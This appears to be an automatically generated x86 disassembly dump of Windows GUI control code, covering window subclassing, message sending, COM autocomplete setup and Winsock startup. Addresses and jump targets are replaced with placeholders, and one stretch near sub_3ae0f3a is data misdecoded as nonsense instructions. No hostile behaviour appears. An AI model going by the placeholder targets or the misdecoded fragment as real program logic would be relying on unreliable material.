sub_3ae0764
push ebx
mov ebx eax
cmp dl [ ebx + 0x2d8 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x2d8 ] dl
cmp dl 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_3ab4518
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
sub_3ae07ac
push esi
mov esi eax
mov eax esi
call sub_3ab1dc0
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop esi
retn
cmp [ esi + 0x2d8 ] 0x2
jae r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_3ae07d8
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_3ab713c
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
add esp 0x10
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x2b8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x288 ]
test eax eax
je r-xdata
push 0x0
lea edx [ esp + 0x4 ]
push edx
push eax
call InvalidateRect
push 0x0
lea edx [ esp + 0x4 ]
push edx
push eax
call InvalidateRect
sub_3ae0838
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_3ab17f8
mov eax ebx
call sub_3aafde0
test al al
je r-xdata
cmp [ ebx + 0x2d8 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_3ac463c
test eax eax
je r-xdata
push 0x15
call GetSystemMetrics
mov edx [ ebx + 0x48 ]
sub edx eax
movsx eax [ esi + 0x8 ]
cmp edx eax
jle r-xdata
cmp ebx [ eax + 0x268 ]
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_3ab02fc
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_3aafdf0
sub_3ae08d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3ae0bf9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_3a9841c
push 0x5
mov eax [ ebp - 0x8 ]
call sub_3ab7c38
push eax
call GetWindow
mov ebx eax
mov eax [ ebp - 0x8 ]
mov [ eax + 0x290 ] ebx
mov esi ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x2b8 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov edx [ ebp - 0x8 ]
mov [ edx + 0x2bc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c0 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2b8 ]
push eax
call SetWindowLongA
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x2d8 ]
sub al 0x2
jae r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x5
push 0x5
mov eax [ ebp - 0x8 ]
call sub_3ab7c38
push eax
call GetWindow
push eax
call GetWindow
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2cc ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x288 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2d8 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2dc ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov eax [ ebp - 0x8 ]
mov [ eax + 0x2d0 ] 0x1
xor eax eax
push ebp
push sub_3ae0afc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x2cc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2dc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2dc ]
call sub_3a7b21c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x288 ]
push eax
call __imp_SendMessageA
mov eax [ ebp - 0x8 ]
mov esi ebx
mov [ eax + 0x288 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov edx [ ebp - 0x8 ]
mov [ edx + 0x298 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x294 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x288 ]
push eax
call SetWindowLongA
mov eax [ ebp - 0x8 ]
mov esi ebx
mov [ eax + 0x28c ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov edx [ ebp - 0x8 ]
mov [ edx + 0x2a0 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x29c ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x28c ]
push eax
call SetWindowLongA
push 0x2
push ebx
call GetWindow
mov ebx eax
mov eax [ ebp - 0x8 ]
movzx edx [ eax + 0x2d9 ]
mov eax [ ebp - 0x8 ]
call sub_3ae0c44
mov eax [ ebp - 0x8 ]
add eax 0x2b0
call sub_3a66cb4
mov eax [ ebp - 0x8 ]
add eax 0x2b0
call sub_3a66cb4
push eax
push r-xdata
push 0x1
push 0x0
mov eax [ rw-data ]
push eax
call CoCreateInstance
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2b0 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c8 ]
call sub_3abec10
push eax
push 0x0
push 0x402
mov eax [ ebp - 0x8 ]
call sub_3ab7c38
push eax
call PostMessageA
mov eax [ ebp - 0x8 ]
add eax 0x2cc
call sub_3a6efbc
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x8 ]
call sub_3aafc7c
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x2d4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2dc ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov eax [ ebp - 0x8 ]
mov [ eax + 0x2d0 ] 0x0
retn
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae0c00
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
push 0x0
push 0x0
push 0x407
mov eax [ ebp - 0x8 ]
call sub_3ab7c38
push eax
call SendMessageA
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2dc ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x2dc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ae15d8
mov edx eax
test edx edx
je r-xdata
lea eax [ ebp - 0x4 ]
call sub_3a66ccc
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2b0 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_3ae0e30
sub edx 0xffffffec
sub_3ae0c44
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
xor edi edi
movzx eax [ esp ]
mov [ ebx + 0x2d9 ] al
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov esi rw-data
jae r-xdata
and edx 0x7f
bt [ ebx + 0x2d9 ] edx
inc eax
add esi 0x4
cmp al 0x5
jne r-xdata
or edi [ esi ]
mov edx eax
cmp dl 0x7
ja r-xdata
push edi
push 0x0
push 0x40e
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
sub_3ae0ca4
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov al 0x1
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
sub_3ae0cdc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_3ab8850
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0xa4 ]
mov eax edi
call sub_3ae062c
cmp [ edi + 0x2c8 ] 0x0
jne r-xdata
mov edx [ esi + 0xc8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xdc ]
inc eax
je r-xdata
test bl bl
je r-xdata
sub_3ae0d40
push ebx
mov ebx eax
mov eax ebx
call sub_3a98640
movzx eax [ r-xdata ]
and ax [ ebx + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov eax ebx
call sub_3ab4518
sub_3ae0d90
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x2dc ]
call sub_3a7b21c
test eax eax
jle r-xdata
mov eax ebx
call sub_3ab4248
pop esi
pop ebx
retn
cmp [ ebx + 0x2cc ] 0x0
jne r-xdata
test [ ebx + 0x55 ] 0x20
je r-xdata
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a7b014
mov esi eax
mov [ ebx + 0x2cc ] esi
mov edx [ ebx + 0x2dc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
mov [ ebx + 0x2d4 ] eax
sub_3ae0df4
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_3ab7fd8
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x288 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x28c ]
je r-xdata
cmp eax [ esi + 0x2b8 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_3ae0e30
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3ae0f2f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae0f36
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
cmp [ ebx + 0x2b0 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebx + 0x2b0 ]
call sub_3a6efcc
test al al
je r-xdata
test [ ebx + 0x2b4 ] 0x1
setne al
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x2b0 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
movzx eax [ r-xdata ]
cmp al [ ebx + 0x2b4 ]
jne r-xdata
xor eax eax
test [ ebx + 0x2b4 ] 0x1
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
jmp r-xdata
test [ ebx + 0x2b4 ] 0x2
je r-xdata
or eax 0x1
test [ ebx + 0x2b4 ] 0x4
je r-xdata
or eax 0x2
test [ ebx + 0x2b4 ] 0x8
je r-xdata
or eax 0x4
test [ ebx + 0x2b4 ] 0x10
je r-xdata
or eax 0x8
test [ ebx + 0x2b4 ] 0x20
je r-xdata
or eax 0x10
test [ ebx + 0x2b4 ] 0x40
je r-xdata
or eax 0x20
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
jmp r-xdata
or eax 0x40
sub_3ae0f3a
add [ eax ] al
ror [ ebx - 0x40 ] 0xea
xchg ecx eax
aaa
rcl [ ecx ] cl
mov ebx 0x97600095
jpo r-xdata
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
dec esp
add [ eax ] al
add [ eax ] al
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ esp ]
cmp al [ ebx + 0x2b4 ]
je r-xdata
pop edx
pop ebx
retn
movzx eax [ esp ]
mov [ ebx + 0x2b4 ] al
mov eax ebx
call sub_3ae0e30
sub_3ae0f78
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3ab7c38
mov edx [ esi + 0x8 ]
mov [ edx + 0xc ] eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_3ae0fc8
push ebx
push esi
mov esi edx
mov eax [ eax + 0x1c ]
call sub_3ae00c4
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax ebx
call sub_3a7aebc
pop esi
pop ebx
retn
sub_3ae0fec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov eax [ eax + 0x1c ]
call sub_3ae00c4
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax ebx
call sub_3a7aebc
pop edi
pop esi
pop ebx
retn
sub_3ae101c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_3ae107a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_3a7b178
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
call sub_3ab7fd8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae1081
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
call sub_3ab4518
sub_3ae1084
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a64350
mov eax edi
mov edx [ eax ]
call [ edx + 0x84 ]
push eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x80 ]
mov ecx esi
mov dl 0x1
call sub_3ad29ec
mov [ edi + 0x1c ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ae10e0
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
lea eax [ esi + 0x1c ]
call sub_3a6efbc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a7b5ac
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3ae111c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3ae1259
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebx + 0x1c ]
call sub_3ad29b4
mov edx [ eax + 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_3a65338
mov edx esi
mov eax [ ebx + 0x1c ]
call sub_3ad29b4
mov eax [ eax + 0x10 ]
push eax
mov edx edi
mov eax [ ebx + 0x1c ]
call sub_3ad29b4
pop edx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx esi
mov eax [ ebx + 0x1c ]
call sub_3ad29b4
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx edi
mov eax [ ebx + 0x1c ]
call sub_3ad29b4
mov eax [ eax + 0x18 ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x1c ]
call sub_3ad29b4
mov eax [ eax + 0x18 ]
push eax
mov edx edi
mov eax [ ebx + 0x1c ]
call sub_3ad29b4
pop edx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx esi
mov eax [ ebx + 0x1c ]
call sub_3ad29b4
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx edi
mov eax [ ebx + 0x1c ]
call sub_3ad29b4
mov eax [ eax + 0x1c ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x1c ]
call sub_3ad29b4
mov eax [ eax + 0x1c ]
push eax
mov edx edi
mov eax [ ebx + 0x1c ]
call sub_3ad29b4
pop edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx esi
mov eax [ ebx + 0x1c ]
call sub_3ad29b4
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx edi
mov eax [ ebx + 0x1c ]
call sub_3ad29b4
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x1c ]
call sub_3ad29b4
mov eax [ eax + 0x20 ]
push eax
mov edx edi
mov eax [ ebx + 0x1c ]
call sub_3ad29b4
pop edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx esi
mov eax [ ebx + 0x1c ]
call sub_3ad29b4
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae1260
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3ae1268
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x1c ]
call sub_3ad29b4
mov edx [ eax + 0x10 ]
mov eax edi
call sub_3a652f4
pop edi
pop esi
pop ebx
retn
sub_3ae12bc
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax [ esp ]
mov eax [ eax + 0x1c ]
call sub_3a7b21c
dec eax
test eax eax
jl r-xdata
mov eax [ esp + 0x8 ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
inc eax
mov [ esp + 0xc ] eax
xor ebp ebp
mov esi [ esp + 0x4 ]
test esi esi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
push esi
mov eax [ esp + 0x8 ]
call sub_3a65730
push eax
push ebx
mov [ esp + 0x1c ] edi
mov eax [ esp + 0x1c ]
call sub_3a65730
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
jne r-xdata
sub esi 0x4
mov esi [ esi ]
inc ebp
dec [ esp + 0xc ]
jne r-xdata
mov [ esp + 0x8 ] ebp
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x1c ]
mov edx ebp
call sub_3ad29b4
mov edi [ eax + 0x10 ]
mov [ esp + 0x10 ] edi
mov ebx [ esp + 0x10 ]
test ebx ebx
je r-xdata
sub_3ae137c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x1c ]
call sub_3ad29b4
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x14 ]
pop edi
pop esi
pop ebx
retn
sub_3ae139c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x1c ]
call sub_3ad29b4
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
pop edi
pop esi
pop ebx
retn
sub_3ae13bc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x18 ]
call sub_3ab7fd8
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x18 ]
call sub_3ab7c38
push eax
call __imp_SendMessageA
xor bl 0x1
test bl bl
je r-xdata
mov eax [ esi + 0x18 ]
call sub_3ab0188
sub_3ae140c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_3a65720
xor eax eax
push ebp
push sub_3ae1474
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x278 ]
call sub_3adab2c
mov ebx eax
mov ecx esi
xor edx edx
mov eax ebx
call sub_3ada76c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_3ada5a8
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_3ada65c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae147b
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3ae1484
push ebx
push esi
mov esi edx
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x278 ]
call sub_3adab2c
mov ebx eax
mov ecx [ esi + 0x18 ]
xor edx edx
mov eax ebx
call sub_3ada76c
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_3ada5a8
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_3ada65c
pop esi
pop ebx
retn
sub_3ae14bc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x9c ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x20 ]
mov eax esi
mov edx [ r-xdata ]
call sub_3a64530
mov edx edi
mov eax esi
call sub_3ade960
sub_3ae14f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_3a65720
xor eax eax
push ebp
push sub_3ae1550
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_3a64530
push esi
push 0xffffffff
push 0xffffffff
mov edx [ ebp + 0x8 ]
push edx
mov eax [ eax + 0x2dc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_3ae00d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae1557
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3ae1560
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_3a64530
mov edx [ ebx + 0x18 ]
push edx
push 0xffffffff
push 0xffffffff
mov ecx [ ebx + 0x14 ]
push ecx
mov eax [ eax + 0x2dc ]
mov ecx edx
mov edx [ ebx + 0x10 ]
call sub_3ae00d0
pop esi
pop ebx
retn
sub_3ae1594
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebx + 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ae15d8
mov esi eax
mov eax [ ebp + 0xc ]
mov edx esi
test edx edx
je r-xdata
xor edx edx
mov [ eax ] edx
call sub_3a66ccc
mov eax [ ebx + 0x10 ]
mov [ esi + 0x10 ] eax
xor eax eax
pop esi
pop ebx
pop ebp
retn 0x8
sub edx 0xffffffec
sub_3ae15d8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a64350
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ae1620
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xc ]
call sub_3ad29b4
mov edx [ eax + 0x10 ]
mov eax edi
call sub_3a652f4
pop edi
pop esi
pop ebx
retn
sub_3ae1644
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_3ae170a
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_3ae1614
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jge r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ ebp - 0x8 ]
jl r-xdata
cmp ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ eax ] ebx
lea ecx [ ebp - 0xc ]
mov edx [ esi + 0x10 ]
mov eax esi
call sub_3ae1620
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_3a65bdc
mov eax [ ebp - 0x4 ]
call sub_3a65bfc
mov edi eax
add edi edi
lea eax [ edi + 0x2 ]
push eax
call CoTaskMemAlloc
mov edx [ ebp + 0x10 ]
mov [ edx + ebx * 4 ] eax
lea edx [ edi + 0x2 ]
mov eax [ ebp + 0x10 ]
mov eax [ eax + ebx * 4 ]
xor ecx ecx
call sub_3a63a44
mov eax [ ebp + 0x10 ]
mov eax [ eax + ebx * 4 ]
mov ecx edi
mov edx [ ebp - 0x4 ]
call sub_3a67f40
inc ebx
inc [ esi + 0x10 ]
mov ebx 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae1711
lea eax [ ebp - 0xc ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a65a7c
retn
sub_3ae1730
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_3ae1614
mov edx [ ebp + 0xc ]
add [ ebx + 0x10 ] edx
cmp eax [ ebx + 0x10 ]
jle r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
mov eax 0x1
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_3ae175c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3ae17cb
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae17d2
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_3a65dec
mov eax rw-data
mov edx [ r-xdata ]
call sub_3a65dec
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_3ae27d8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
xor edx edx
push ebp
push sub_3ae2880
push [ fs : edx ]
mov [ fs : edx ] esp
test eax eax
je r-xdata
xor ebx ebx
call WSAGetLastError
mov ebx eax
cmp ebx 0x2733
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae2887
lea eax [ ebp - 0x1c ]
call sub_3a652a0
retn
call sub_3a672cc
cmp [ eax + 0x3c ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_3a6cae0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x18 ]
push eax
push 0x2
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
jmp r-xdata
call sub_3a672cc
mov esi [ eax + 0x3c ]
mov eax ebx
call esi
jmp r-xdata
sub_3ae2890
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_3ae2919
push [ fs : eax ]
mov [ fs : eax ] esp
push rw-data
push 0x101
call WSAStartup
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae2920
lea eax [ ebp - 0x1c ]
call sub_3a652a0
retn
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_3a6cae0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
mov eax r-xdata
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x18 ]
push eax
push 0x2
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
sub_3ae293c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor eax eax
